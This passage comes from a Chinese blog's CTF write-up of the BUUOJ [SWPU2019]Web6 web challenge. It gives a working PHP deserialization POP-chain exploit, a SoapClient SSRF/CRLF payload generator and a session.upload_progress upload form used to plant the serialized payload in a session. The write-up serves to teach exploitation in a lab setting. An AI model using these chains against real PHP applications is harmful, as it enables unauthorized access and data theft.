class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">class aa</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($name,$param)</span><br><span class="line">        &#123;</span><br><span class="line">            if($this-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 &#x3D; $this-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __get($ke)</span><br><span class="line">        &#123;</span><br><span class="line">            return $this-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class bb</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class cc</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public $mod3;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 &#x3D; $this-&gt;mod3.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dd</span><br><span class="line">&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        public $flag;</span><br><span class="line">        public $b;</span><br><span class="line">        </span><br><span class="line">        public function getflag()</span><br><span class="line">        &#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a &#x3D; array(reset($_SESSION),$this-&gt;flag);</span><br><span class="line">                echo call_user_func($this-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ee</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; $_POST[&#39;aa&#39;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>  根据<code>se.php</code>构造反序列化链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. dd-&gt;getflag()是肯定要运行的</span><br><span class="line">2. 用ee-&gt;__toString()来构造(1)</span><br><span class="line">3. 用cc-&gt;__invoke()中的字符串连接来触发(2)</span><br><span class="line">4. 用aa-&gt;__call()中的&#96;$s1()&#96;来触发(3)</span><br><span class="line">5. 用bb-&gt;__destruct()来触发(4)</span><br></pre></td></tr></table></figure>

<p>所以逻辑反过来写代码，得到如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">class aa</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class bb</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cc</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public $mod3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dd</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $flag;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class ee</span><br><span class="line">&#123;</span><br><span class="line">    public $str1;</span><br><span class="line">    public $str2;</span><br><span class="line">&#125;</span><br><span class="line">$b &#x3D; new bb();</span><br><span class="line">$a &#x3D; new aa();</span><br><span class="line">$b-&gt;mod1 &#x3D; $a;</span><br><span class="line"></span><br><span class="line">$c &#x3D; new cc();</span><br><span class="line">$a-&gt;mod2[&#39;test2&#39;] &#x3D; $c;</span><br><span class="line"></span><br><span class="line">$e &#x3D; new ee();</span><br><span class="line">$c-&gt;mod1 &#x3D; $e;</span><br><span class="line">$d &#x3D; new dd();</span><br><span class="line">$e-&gt;str1 &#x3D; $d;</span><br><span class="line">$e-&gt;str2 &#x3D; &#39;getflag&#39;;</span><br><span class="line"></span><br><span class="line">$d-&gt;flag &#x3D; &#39;&#123;1&#125;&#39;;</span><br><span class="line">$d-&gt;b &#x3D; &#39;&#123;2&#125;&#39;;</span><br><span class="line"></span><br><span class="line">echo serialize($b);</span><br></pre></td></tr></table></figure>

<p>接下来就是将上述代码中的<code>{1},{2}</code>填入。</p>
<ol start="4">
<li>根据<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F3339%23toc-3" target="_blank" rel="noopener">LCTF2018</a>中<code>bestphp&#39;s revenge</code>中解法，我们可以判断的是我们需要先将<code>soapclient</code>对象反序列化的数据写入<code>session</code>，在上述的<code>{2}</code>填入<code>call_user_func</code>。构造<code>soapclient</code>对象反序列化的数据如下：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&#39;;</span><br><span class="line">$post_string &#x3D; &#39;a&#x3D;1&amp;b&#x3D;2&#39;;</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;X-Forwarded-For: 127.0.0.1&#39;,</span><br><span class="line">    &#39;Cookie: user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&#39;,</span><br><span class="line">    );</span><br><span class="line">$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers),&#39;uri&#39;      &#x3D;&gt; &quot;aaab&quot;));</span><br><span class="line">$aaa &#x3D; serialize($b);    </span><br><span class="line">$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);</span><br><span class="line">echo urlencode($aaa);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>网上的脚本，需要设置的主要是<code>$target</code>和<code>headers</code>, 其中<code>headers</code><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqq_42181428%2Farticle%2Fdetails%2F100569464" target="_blank" rel="noopener">利用SoapClient类进行SSRF+CRLF攻击</a></p>
<p><code>$target</code>为什么要设置为<code>interface.php</code>而不是<code>http://127.0.0.1/index.php?method=get_flag</code>，因为这样没有实例化Soapclient，如果我们调用interface.php就会实例化Soapclient类，这样才能有交互，才能返回值。实际上。我们能返回到信息，是因为这边已经实例化了<code>SoapServer</code>类的原因。</p>
<p>interface.php源代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php   </span><br><span class="line">    include(&#39;Service.php&#39;);</span><br><span class="line">    $ser &#x3D; new SoapServer(&#39;Service.wsdl&#39;,array(&#39;soap_version&#39;&#x3D;&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(&#39;Service&#39;);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>使用了<code>SoapServer</code>生成了<code>wsdl</code>文档，传入类<code>Service</code>来启用接口服务。</p>
<p>当客户端实例化了<code>SoapClient</code>后，就可以调用到<code>Service</code>类中的任意方法，并通过<code>return</code>得到回显</p>
<p>而如果我们仅仅是通过<code>SoapClient</code>调用不存在的方法触发<code>ssrf</code>，是不会得到回显的，而这里<code>Service</code>类的<code>get_flag</code>方法显然是需要通过回显来得到<code>flag</code>。在本地我们搭建环境测试一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#server.php</span><br><span class="line">&lt;?php </span><br><span class="line">class Service</span><br><span class="line">&#123;</span><br><span class="line">    public function Get_flag()&#123;</span><br><span class="line">        return &quot;flag&#123;xxx&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ser &#x3D; new SoapServer(null,array(&#39;uri&#39;&#x3D;&gt;&#39;sampleA&#39;));</span><br><span class="line">$ser-&gt;setClass(&#39;Service&#39;);</span><br><span class="line">$ser-&gt;handle();</span><br><span class="line">?&gt;</span><br><span class="line">#client</span><br><span class="line">&lt;?php</span><br><span class="line">$client &#x3D; new SoapClient(null, array(</span><br><span class="line">        &#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;soap&#x2F;server.php&#39;,</span><br><span class="line">        &#39;uri&#39;&#x3D;&gt;&#39;sampleA&#39;</span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line">echo $client-&gt;Get_flag(); &#x2F;&#x2F;flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>

<p>这就需要利用<code>SoapServer</code>,通过反序列化<code>SoapClient</code>类，<code>location</code>指向<code>interface.php</code>即服务端，因为服务端的<code>setClass</code>为<code>Service</code>类，而<code>Get_flag</code>方法在<code>Service</code>类中，最后我们通过<code>call_user_func</code>调用<code>SoapClient</code>类的<code>Get_flag</code>方法即调用了<code>Service</code>类的<code>Get_flag</code>方法。</p>
<p>所以在刚才的<code>{1}</code>需要填写我们要调用的方法，即<code>Get_flag</code>。</p>
<ol start="5">
<li>接下来是写入session，这里通过<code>session.upload_progress</code>上传一个可控的<code>session</code>文件，然后由于<code>session</code>引擎的切换造成<code>session反序列化漏洞</code>，就可以控制一下<code>$_SESSION</code>，参考这篇文章<a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">利用session.upload_progress进行文件包含和反序列化渗透</a>        </li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#upload.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;5805442f-a566-4f5d-99e5-feb7310dc232.node3.buuoj.cn&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>将生成的payload粘贴复制到<code>PHP_SESSION_UPLOAD_PROGRESS</code>的下面，然后url解码，在前面加个<code>|</code>,并增加cookie信息指定sessionid</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200326154119737.png" alt></p>
<p>此时我们已经将<code>poc</code>写入到<code>session中PHPSESSID</code>为bbb的值中。<br> 上传<code>se.php</code>反序列化的数据，即可获得<code>flag</code></p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200326154509055.png" alt></p>
<p>注意点：在php里面serialize之后一定要urlencode，不然粘贴复制的话很容易丢失一些不可见字符</p>
<p>参考资料：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/20175211lyz/p/12285279.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12285279.html</a></p>
<p><a href="https://blog.csdn.net/a3320315/article/details/103760266" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/103760266</a></p>
<p><a href="http://github.mrkaixin.computer/2020/03/16/BUU(三)/" target="_blank" rel="noopener">http://github.mrkaixin.computer/2020/03/16/BUU(%E4%B8%89)/</a></p>
<p>[<a href="http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019%20wp/#web6]" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019%20wp/#web6]</a>(<a href="http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019</a> wp/#web6)</p>
</blockquote>

  </div>
</article>

        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-强网杯-2019-Upload"><span class="toc-number">1.</span> <span class="toc-text">0x 01 强网杯 2019]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-CISCN2019-华东南赛区-Web11"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [CISCN2019 华东南赛区]Web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-Wallbreaker-Easy"><span class="toc-number">3.</span> <span class="toc-text">0x 03 Wallbreaker_Easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-SWPU2019-Web4"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [SWPU2019]Web4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-SWPU2019-Web3"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [SWPU2019]Web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-SWPUCTF-2018-SimplePHP"><span class="toc-number">6.</span> <span class="toc-text">0x 06 [SWPUCTF 2018]SimplePHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-SWPU2019-Web6"><span class="toc-number">7.</span> <span class="toc-text">0x 07 [SWPU2019]Web6</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/&title=BUUOJ-web刷题（二）" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/&title=BUUOJ-web刷题（二）" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/&text=BUUOJ-web刷题（二）" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BUUOJ-web刷题（二）&body=Check out this article: http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 John Doe 
    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
    
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
  
  <div class="footer-custom">
    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
     
      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
        <img class="img-response" src="/images/upyun.png" alt="cdn image">
      </a>
    
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">


<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>


<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

</body>
</html>
